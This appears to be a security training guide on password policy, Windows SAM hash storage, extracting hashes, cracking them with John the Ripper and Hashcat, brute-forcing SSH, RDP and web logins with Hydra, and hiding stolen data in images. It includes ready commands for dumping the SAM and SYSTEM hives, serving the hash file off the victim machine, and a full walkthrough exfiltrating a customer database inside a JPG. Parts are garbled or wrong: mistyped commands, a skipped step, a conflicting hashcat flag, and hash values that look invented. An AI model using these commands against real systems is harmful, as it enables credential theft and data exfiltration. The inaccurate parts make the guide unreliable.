Password Complexity & Policy

Understanding password standards and enforcement mechanisms

What is a Complex Password?

Complex Password Definition: Combination of uppercase, lowercase, symbols, and numeric characters

  • Uppercase: A-Z (at least 1 required)
  • Lowercase: a-z (at least 1 required)
  • Numeric: 0-9 (at least 1 required)
  • Symbols: !@#$%^&* (at least 1 required)
  • Minimum Length: 20+ characters recommended

Weak vs Strong Password Examples

Password Example Classification Why It's Weak/Strong Estimated Crack Time
password WEAK All lowercase, no numbers/symbols <1 second
Password123 MEDIUM Mixed case but predictable pattern Minutes
Asd#FG$h!8@p5 STRONG All character types, random Years
P@ssw0rd!2024#Secure STRONG 20+ characters, all types mixed Centuries

Password Complexity in Windows

Windows Policy Settings:

  • Maximum Password Age: Force password change every X days
  • Minimum Password Age: Prevent immediate password reuse
  • Minimum Password Length: Enforce minimum characters (default: 8, recommended: 20)
  • Password Complexity: Require mixed character types
  • Password History: Remember previous X passwords to prevent reuse

Configuring Password Policy in Windows

# Open Password Policy Editor
secpol.msc

# Navigate to:
# Account Policies → Password Policy

# Recommended Settings:
Minimum Password Length: 20
Password Complexity: ENABLED
Maximum Password Age: 90 days
Minimum Password Age: 1 day
Password History: 24 passwords remembered

# Enforce policy via Group Policy:
gpedit.msc
⚠️ COMMON MISTAKES: Users choosing predictable patterns (Password123), reusing passwords across sites, writing passwords down, or disabling complexity requirements for "convenience".
✓ BEST PRACTICE: Use passphrases (3-4 random words), enable multi-factor authentication, use password managers, and enforce organizational policies.

Types of Password Attacks

Understanding attack vectors and their characteristics

Passive Attacks (Non-Technical)

  • Shoulder Surfing: Attacker stands behind victim and observes password entry
  • Dumpster Diving: Searching trash for written passwords or sensitive documents
  • Social Engineering: Psychological manipulation to extract passwords

Risk Level: Medium - No technical skill required, high success rate with employees

Active Online Attacks (Live Machine Access)

  • Keylogger: Captures keystrokes while victim types passwords
  • Password Guessing: Systematic attempts on live system
  • Direct Machine Access: Attacker interacts with victim's machine in real-time

Risk Level: CRITICAL - Attacker watches victim input passwords live; can trigger alarms

Passive Online Attacks (Remote)

  • No Direct Machine Access: Attacker performs cracking remotely
  • Network-Based: Sniffing traffic, man-in-the-middle attacks
  • Service Enumeration: Testing credentials against services (SSH, RDP, FTP)

Risk Level: High - No direct victim interaction required; hard to detect

Offline Attacks (Separate System)

  • SAM File Extraction: Copy password hashes to separate computer
  • Hidden Location Cracking: Crack hashes on attacker's own machine
  • No Time Pressure: Attacker can spend hours/days cracking at own pace
  • No Alerts: Victim's system doesn't detect cracking attempts

Risk Level: CRITICAL - Can access powerful GPU clusters; most effective method

Attack Methods Comparison

Attack Type Detection Risk Time to Crack Success Rate Tools Required
Shoulder Surfing Very High Instant 70%+ (with observation) None
Social Engineering None Minutes 50-80% (avg employee) None
Keylogger High (if signatures checked) Instant 95%+ Keylogger tool
Offline Cracking None Hours-Days 80-95% (with good wordlist) John/Hashcat/GPU

Attack Chain Example: Complete Password Compromise

  1. Reconnaissance: Attacker identifies target employee
  2. Social Engineering: Builds rapport, gains trust over weeks
  3. Physical Access: Gets access to victim's workstation momentarily
  4. SAM Extraction: Copies SAM and System files to USB
  5. Offline Cracking: Uses GPU to crack hashes at home
  6. Account Access: Logs in with cracked credentials

  8. Objectives: Steals data or plants malware

SAM File & Windows Authentication

Understanding Windows password storage mechanism

What is the SAM File?

SAM (Security Accounts Manager) is a database where Windows stores user credentials

  • Location: C:\Windows\System32\config\SAM
  • Protection: System file - highly protected by Windows
  • Contents: Usernames and password hashes (NTLM format)
  • Format: Binary database requiring special tools to read
  • Access: Even administrators cannot directly access while system running

How Windows Authentication Works

1 User enters username and password at login screen
↓
2 Operating system hashes the entered password
↓
3 Compare hash with hash stored in SAM file
↓
4 If hashes match → Access granted; if not → Access denied

🔑 Critical Insight:

Windows NEVER stores plaintext passwords! It only stores cryptographic hashes. Even system administrators cannot view original passwords - they can only reset them.

SAM File Structure

# SAM File Contents (format):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# [Username]:[RID]:[LM_Hash]:[NTLM_Hash]::[remarks]

# Example breakdown:
# Username: Administrator
# RID (Relative ID): 500 (always 500 for admin)
# LM Hash: aad3b435b51404eeaad3b435b51404ee (LAN Manager - weak, deprecated)
# NTLM Hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (NT LAN Manager - modern)

# NTLM Hash Format:
# - 32 hexadecimal characters
# - One-way hashing algorithm (cannot be reversed)
# - Salting NOT used (vulnerability)
# - Same password always produces same hash (enables rainbow tables)
⚠️ VULNERABILITY: Windows NTLM does not use salting. This means identical passwords produce identical hashes across all computers, enabling rainbow table attacks.

Supporting File: SYSTEM File

Located at: C:\Windows\System32\config\SYSTEM

  • Purpose: Contains encryption key needed to decrypt SAM file
  • Relationship: SAM data is partially encrypted; SYSTEM key decrypts it
  • Both Required: Attackers must extract BOTH SAM and SYSTEM files
  • Tools Handle This: Modern tools (PWDump, Lazagne) handle decryption automatically

Password Storage & Hash Formats

Understanding cryptographic storage and vulnerabilities

NTLM Hash Structure & Weaknesses

  • Algorithm: MD4 hashing (cryptographically broken)
  • Hash Length: 128 bits = 32 hexadecimal characters
  • Salting: NO - same password = same hash across all systems
  • Iterations: Single pass (no key stretching)
  • Speed: Fast hashing = fast brute force attacks

Hash Function Comparison

Hash Algorithm Used By Salted? Speed Security Status
LM Hash (DES) Windows 95-2000 No Very Fast Broken DEPRECATED
NTLM (MD4) Windows XP-8.1 No Fast Weak LEGACY
NTLMv2 Windows Vista+ Partial Fast Medium Current
Bcrypt Modern Apps Yes Slow Strong RECOMMENDED
Argon2 Latest Standard Yes Variable Very Strong BEST

Rainbow Tables: Pre-Computed Hash Attack

Since NTLM doesn't use salting, attackers can pre-compute hashes:

  • Concept: Generate hashes for billions of passwords in advance
  • Storage: Rainbow tables can be 100GB+ in size
  • Speed: Instant lookup: enter hash → get password
  • Availability: Pre-computed tables freely available online
  • Result: Common passwords crack in microseconds

NTLM vs Modern Hash Comparison

# NTLM Hash (Windows Legacy)
Password: "Admin123!"
NTLM Hash: 3e7b8f9c2d5a1e4b6f3a8c2e5b9d1f4a

# Bcrypt Hash (Modern Standard)
Password: "Admin123!"
Bcrypt: $2b$12$wJ7FQIc5xbIZjEGzCaXLBe7S3NjP8kL5mK2N6oP9qR4sT5uV8wX3y

# Key Differences:
NTLM:  32 char hex, no indicator of algorithm, no salt visible
Bcrypt: Base64 encoded, includes algorithm ($2b$), includes salt, includes cost factor (12)

# Crack Time Comparison (on modern GPU):
NTLM:    < 1 minute for common passwords
Bcrypt:  Hours to days even with GPU clusters
✓ RECOMMENDATION: Use Bcrypt, Scrypt, Argon2 for new applications. These include salting and slow hashing which makes brute force attacks impractical.

Extracting SAM Files & Password Hashes

Techniques for accessing protected password databases

⚠️ LEGAL WARNING: SA file extraction and password cracking is ILLEGAL without explicit authorization. This information is for defensive security purposes only.

Why SAM Files are Protected

  • System Lock: SAM file is locked by Windows while running
  • Permission Issues: Even administrators cannot copy while system active
  • Encryption: Partially encrypted using SYSTEM key
  • File Locking: Cannot be deleted, modified, or copied during normal operation

Attack Scenario: SAM File Extraction

Step 1: Determine File Location ▼
Location: C:\Windows\System32\config\SAM Also need: C:\Windows\System32\config\SYSTEM

Note: Both files required for successful extraction

Step 2: Use Special Tools ▼
Tool: PWDump7 or Reg.exe Command: REB SAVE hklm\sam C:\path\sam REG SAVE hklm\system C:\path\system

Advantage: Bypasses file locking mechanism

Step 3: Extract Hashes ▼
Tool: SAMdump2 Command: samdump2 system sam > hashes.txt Output: Administrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Result: Plaintext NTLM hashes extracted to file

Step 4: Transfer to Attacker Machine ▼
Method 1: USB Drive Method 2: HTTP Server Method 3: Email Method 4: Cloud Storage Command: python -m http.server 8000 Browser: http://victim-ip:8000/hashes.txt

Goal: Get hash file to attacker's machine for offline cracking

Tools Used for SAM Extraction

  • PWDump7: Extracts hashes from live or offline SAM files
  • Lazagne: Extracts passwords from applications and storage
  • Mimikatz: Extracts plaintext passwords from memory
  • NTDS Stealer: For domain controller Active Directory extraction
  • Reg.exe: Built-in Windows tool to save registry hives
✓ DEFENSE: Enable BitLocker, use UEFI Secure Boot, disable unnecessary accounts, monitor SAM file access, and use tools that detect hash extraction attempts.

Overview of major tools and their capabilities

Major Password Cracking Tools

🔑 John the Ripper

  • Type: Dictionary-based and rules-based cracker
  • Strength: Versatile, supports many hash formats

  • Type: Network service password cracker
  • Strength: Brute Force remote services
  • Speed: Depends on target service
  • Best For: SSH, RDP, FTP, HTTP login attacks

📝 Lazagne

  • Type: Credential extraction tool
  • Strength: Extracts passwords from applications
  • Speed: Instant (no cracking needed)
  • Best For: Extracting saved passwords from Windows/Linux
  • Command: python lazagne.py all

Wordlist Strategy

Wordlist Importance: Quality of wordlist determines crack rate (not tool power)

  • Common Wordlists: rockyou.txt (14M passwords), crackstation.txt (1.5B+ passwords)
  • Wordlist Sources: Leaked passwords compiled from breaches
  • Generation: Tools like Hashcat can generate rules-based variations
  • Probability: Using good wordlist = 70-90% crack success rate
  • No Wordlist Match: Brute force remaining (takes years)

💡 Key Insight:

Tool != Success. Success = Good Wordlist + Weak Passwords. Even the most powerful tool cannot crack unique, strong passwords. User behavior matters more than technical capabilities.

John the Ripper: Comprehensive Guide

Detailed techniques and usage patterns

Basic John Usage - NTLM Hashes

# Format: john [options] [password-file]

# Simple attack with wordlist
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Show cracked passwords
john --format=nt hashes.txt --show

# Rules-based attack (modify wordlist on-the-fly)
john --format=nt hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=All4

# Brute force (no wordlist)
john --format=nt hashes.txt --incremental --length=8

# Specific character classes
john --format=nt hashes.txt --incremental=Lower --length=5

Advanced John Techniques

# Mask attack (define pattern)
john --format=nt hashes.txt --mask='?u?l?l?d?d'
# u=uppercase, l=lowercase, d=digit
# Example: Ab12, Xy34

# Rules-based modifications
john --format=nt hashes.txt --wordlist=wordlist.txt --rules --verbose

# GPU acceleration
john --format=nt hashes.txt --wordlist=rockyou.txt --device=cuda

# Show performance
john --format=nt hashes.txt --show

# Export for other tools
john --format=nt hashes.txt --show > cracked.txt

# Session management (pause/resume)
john --format=nt hashes.txt --session=session1 --wordlist=big.txt
# Resume later:
john --session=session1 --restore

Complete John Attack Workflow

Step 1: Prepare Hash File ▼
# Extract hash only (remove username) sed 's/:.*//' hashes.txt > jhashes.txt # Or use unshadow for Linux: unshadow passwd file shadow file > hashes.txt
Step 2: Check Supported Formats ▼
john --list=formats | grep -i windows john --list=formats | grep -i linux # Output examples: # nt, ntlm (Windows NTLM) # des, md5crypt, sha512crypt (Linux)
Step 3: Dictionary Attack ▼
john --format=nt hashes.txt \ --wordlist=/usr/share/wordlists/rockyou.txt \ --verbose # Output: # Session started, 4 cracked, processed 50000, 14000000 remaining # Estimated time: 3 hours (with good GPU)
Step 4: Rules-Based Attack ▼
# If dictionary didn't crack all: john --format=nt hashes.txt \ --wordlist=/usr/share/wordlists/rockyou.txt \ --rules=All4 # Rules modify base words: # Password → PASSWORD, password1, password! # Increases candidates from 14M to 100M+ variations
Step 5: View Results ▼
john --show --format=nt hashes.txt # Output: Administrator:Asd#FG$h!p5:... User123:MyP@ssw0rd1:... Guest:(no password):...

John Rules & Wordlist Mangling

  • All4: Four word mutations (lowercase, capitalize, upper, invert)
  • Single: Single mutation per password
  • Best64: Most effective rules (good crack rate)
  • Jumbo: Maximum mutations (slow but comprehensive)
  • Custom Rules: Create your own mutation patterns

Hashcat & Hydra: Advanced Techniques

GPU acceleration and network service attacks

Hashcat: GPU-Powered Cracking

Advantages: 10-100x faster than CPU-based tools with GPU support

  • Hash Modes: 350+ hash algorithms supported
  • GPU Types: NVIDIA CUDA, AMD HIP, Intel OpenCL
  • Speed: GTX 3090: 200B+ hashes/sec for weak algorithms
  • Format Parameter: -m flag specifies hash type

Hashcat Usage Examples

# NT (Windows) hashes - Mode 1000
hashcat -m 1000 hashes.txt rockyou.txt

# List all supported hash modes
hashcat -h | grep "Hash-Mode"

# Show results
hashcat -m 1000 hashes.txt --show

# Reset database before new session
rm -f hashcat.potfile
hashcat -m 1000 hashes.txt rockyou.txt -o cracked.txt

# Benchmark GPU performance
hashcat -m 1000 -b

# Use rules
hashcat -m 1000 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rules

# Combination attack
hashcat -m 1000 hashes.txt dict1.txt dict2.txt -a 1

# Hybrid attack (dict + mask)
hashcat -m 1000 hashes.txt rockyou.txt -a 6 -m '?d?d?d'
# Appends 3 digits to each worldlist word

Hydra: Network Service Attacks

Purpose: Brute force remote services (SSH, RDP, FTP, HTTP, etc.)

  • Use Case: When you have network access but not hash access
  • Method: Try username/password combinations against live service
  • Limitation: Slower than offline cracking (depends on network)
  • Detection: High risk of detection (failed attempts logged)

Hydra Usage Examples

# SSH brute force
hydra -l admin -P rockyou.txt ssh://192.168.1.100

# SSH with username list
hydra -L users.txt -P passwords.txt ssh://target.com

# RDP attack
hydra -l Administrator -P rockyou.txt rdp://192.168.1.100

# FTP attack
hydra -l admin -P rockyou.txt ftp://192.168.1.100

# HTTP form login (web application)
hydra -l admin -P rockyou.txt http-post-form \
  "192.168.1.100:80/login.php:username=^USER^&password=^PASS^:Invalid"

# Run with multiple threads
hydra -l admin -P rockyou.txt -t 4 ssh://target.com

# Show progress
hydra -l admin -P rockyou.txt -v ssh://target.com

# Save session (pause/resume)
hydra -l admin -P rockyou.txt -o results.txt ssh://target.com

Steganography: Hiding in Plain Sight

Theory and practical applications of data concealment

What is Steganography?

Steganography Definition: Embedding secret messages or data within other data in a way that conceals the very existence of the hidden data

  • vs Cryptography: Crypto obscures meaning; Stego hides existence
  • vs Watermarking: Watermarks are visible; Stego is invisible
  • Purpose: Covert communication without detection
  • Key Principle: Observer unaware that hidden data exists

Steganography Types

Type Medium Capacity Detection Risk Best For
Image Stego JPG, PNG, BMP, GIF Medium Low (visual similarity) Email attachments, cloud storage
Text Stego Documents, websites Low High (patterns detectable) Embedding messages in text
Video Stego MP4, AVI, MOV Very High Low (large file size acceptable) Hiding large files in multimedia
Audio Stego MP3, WAV, FLAC Low Medium (frequency analysis possible) Hiding data in music streams
Network Stego TCP/IP headers, packets Very Low High (anomalies detected) Covert C&C communication

Image Steganography Step-by-Step

Step 1: Select Cover Image

Choose image file (JPG, PNG) - larger image, more data possible

Example: 1MB image can hide 50-100KB data

Step 2: Prepare Secret Data

Compress secret file (ZIP, RAR) to maximize capacity

Encryption optional (adds security layer)

Step 3: Embedding

Modify image pixel values to include hidden data

LSB (Least Significant Bit) method most common

Step 4: Create Stego Image

Output new image file containing secret data

Image appears identical to original (imperceptible changes)

Step 5: Transmission

Send stego image via email, social media, or messaging

Observer unaware image contains hidden data

Step 6: Extraction

Recipient uses stego tool to extract hidden data

Recover original ZIP/RAR file

✓ ADVANTAGE: Steganography has perfect deniability. Even if detected, difficult to prove hidden data exists without passphrase or key.

Image Steganography: Practical Implementation

Hands-on techniques for embedding and extracting data in images

Simple Steganography with Cat Command

# Most basic method: concatenate files
# The resulting file is still readable as JPG but contains hidden ZIP data

cat image.jpg confidential_data.zip > output.jpg

# To extract:
unzip output.jpg

# Operating systems interpret:
# JPG viewers: See the legitimate image
# ZIP extraction: See the hidden data

# File sizes:
# image.jpg: 500 KB
# data.zip: 100 KB
# output.jpg: 600 KB (100KB hidden inside)

Advanced Steganography with Steghide

# Embed data in image with passphrase
steghide embed -cf image.jpg -ef secret.txt -p "MySecretPassphrase"
# Output: image.jpg now contains hidden text AND image

# Extract data from image
steghide extract -sf image.jpg -p "MySecretPassphrase"
# Output: secret.txt extracted

# Get image info
steghide info image.jpg

# Without passphrase, attacker cannot extract even if they suspect data

Complete Steganography Attack Scenario

Step 1: Prepare Secret Data ▼
# Attacker's objective: Send stolen database to external server # File: customer_data.zip (50MB - too large to send normally) # Problem: Email alerts on file size # Solution: Hide in image
Step 2: Compress Data ▼
# Compress to reduce size zip -9 customer_data.zip /path/to/data # 50MB → 15MB after compression # Still too large, but more manageable
Step 3: Find Large Enough Image ▼
# Need image capacity ≥ 15MB # High-resolution image: 20MB (enough space) # Downloaded from internet: photo.jpg # Check image properties file photo.jpg identify photo.jpg # ImageMagick tool identify -verbose photo.jpg # Detailed info
Step 4: Embed Data ▼
# Method: Concatenation cat photo.jpg customer_data.zip > vacation_photo.jpg # Result: 35MB JPG file # Original photo.jpg: 20MB # Hidden data: 15MB # Total: 35MB # Visual appearance: Identical to original photo
Step 5: Exfiltration ▼
# Send via email, shared drives, cloud storage # Email: Attach vacation_photo.jpg → looks innocent # Content filter: Sees only JPG image, not hidden ZIP # HR Department: Receives "vacation photos" in email # Security system: No alerts (just image file)
Step 6: Exfil Extraction ▼
# External attacker receives vacation_photo.jpg # Extract hidden data unzip vacation_photo.jpg # Output: Archive: vacation_photo.jpg inflating: customer_data inflating: database.sql inflating: credit_cards.txt # Successfully exfiltrated 50MB of sensitive data!

Detection Challenges

  • Visual Inspection: Impossible to detect by looking at image
  • File Size: Suspicious if image larger than expected (but can be normal for high-resolution photos)
  • Statistical Analysis: Advanced tools can detect anomalies in pixel data
  • Hash Comparison: Compare against known images (won't match if modified)
  • Metadata Analysis: Examine EXIF data for discrepancies

Steganography Tools & Extraction Techniques

Tools for hiding and detecting hidden data

Popular Steganography Tools

📦 Steghide

  • Type: Universal steganography tool
  • Supported Formats: WAV, AU, FLAC, BMP, JPEG, GIF, PNG
  • Strength: Passphrase protection, compression, encryption
  • Command: steghide embed -cf image.jpg -ef secret.txt -p pass

🖼️ OutGuess

  • Type: JPEG-optimized steganography
  • Method: Uses DCT coefficient modifications
  • Strength: Hides data in JPEG quantization data
  • Command: outguess -e data secret_data output.jpg image.jpg

📝 LSBSteg

  • Type: Least Significant Bit steganography
  • Method: Modifies LSB of pixel values
  • Capacity: 1 bit per pixel channel
  • Command: ./steganography -e -i input.png -o output.png -f data.txt

🔍 Stegdetect

  • Type: Steganography detection tool
  • Method: Analyzes image properties for anomalies
  • Detects: JSteg, OutGuess, Steghide
  • Command: stegdetect -s 2.0 image.jpg

Defense: Detecting Steganography

Statistical Analysis

  • Chi-Square Test: Analyze pixel value distribution
  • Entropy Analysis: Steganography typically increases entropy
  • Histogram Examination: Look for unusual patterns
  • Tool: Steganalysis software automated detection

File Integrity Monitoring

  • Hash Verification: Compare file hashes to known good versions
  • Size Anomalies: Alert on unexpectedly large media files
  • Metadata Check: EXIF data matches expected values?
  • Baseline Comparison: Compare against previous versions

Network-Level Defense

  • DLP (Data Loss Prevention): Monitor outbound files for suspicious patterns
  • Email Filtering: Scan attachments for steganography
  • Behavior Analysis: Unusual file transfers flagged
  • Cloud Storage Monitoring: Track uploads of large media files

Limitations of Detection

  • No Perfect Detection: Well-hidden steganography impossible to detect with certainty
  • False Positives: Legitimate high-resolution images trigger alerts
  • Encrypted Stego: If data is encrypted inside image, even harder to detect
  • Multiple Layers: Stego-within-stego defeats simple detection
  • Evolving Techniques: New methods developed faster than detection tools
